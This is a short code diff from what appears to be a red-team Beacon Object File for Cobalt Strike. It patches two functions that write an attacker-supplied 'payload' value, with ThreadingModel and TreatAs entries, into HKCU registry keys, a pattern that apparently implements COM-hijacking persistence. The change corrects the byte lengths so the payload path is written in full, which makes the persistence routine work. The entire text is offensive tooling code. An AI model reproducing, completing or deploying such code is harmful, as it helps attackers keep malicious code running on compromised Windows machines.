@@ -53,9 +53,9 @@ void CreateRegistryCU(char* regisrtyKey, char* payload) {
     if (lRes == ERROR_SUCCESS) {
             lRes = ADVAPI32$RegCreateKeyExA(hHKCU, regisrtyKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE | KEY_SET_VALUE , NULL, &hSubKey, NULL);
             if(lRes == ERROR_SUCCESS){
-                lRes = ADVAPI32$RegSetValueExA(hSubKey, "", 0, REG_SZ, (LPBYTE)payload, 2);
+                lRes = ADVAPI32$RegSetValueExA(hSubKey, "", 0, REG_SZ, (LPBYTE)payload, strlen(payload) + 1);
                 if(lRes == ERROR_SUCCESS){
-                    lRes = ADVAPI32$RegSetValueExA(hSubKey, "ThreadingModel", 0, REG_SZ, (LPBYTE)"Both", 6);
+                    lRes = ADVAPI32$RegSetValueExA(hSubKey, "ThreadingModel", 0, REG_SZ, (LPBYTE)"Both", 5);
                     if(lRes == ERROR_SUCCESS){
                         BeaconPrintf(CALLBACK_OUTPUT, "[+] Registry Key Path: %s\\%s\n", computer, regisrtyKey);
                         BeaconPrintf(CALLBACK_OUTPUT, "[+] Registry Key Value: %s\n\n", payload);
@@ -97,7 +97,7 @@ void CreateTreatAsRegistryCU(char* regisrtyKey, char* payload){
     if (lRes == ERROR_SUCCESS) {
         lRes = ADVAPI32$RegCreateKeyExA(hHKCU, regisrtyKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE | KEY_SET_VALUE , NULL, &hSubKey, NULL);
         if(lRes == ERROR_SUCCESS) {
-            lRes = ADVAPI32$RegSetValueExA(hSubKey, "", 0, REG_SZ, (LPBYTE)payload, 2);
+            lRes = ADVAPI32$RegSetValueExA(hSubKey, "", 0, REG_SZ, (LPBYTE)payload, strlen(payload) + 1);
             if(lRes == ERROR_SUCCESS) {
                 BeaconPrintf(CALLBACK_OUTPUT, "[+] Registry Key Path: %s\\%s\n", computer, regisrtyKey);
                 BeaconPrintf(CALLBACK_OUTPUT, "[+] Registry Key Value: %s\n\n", payload);
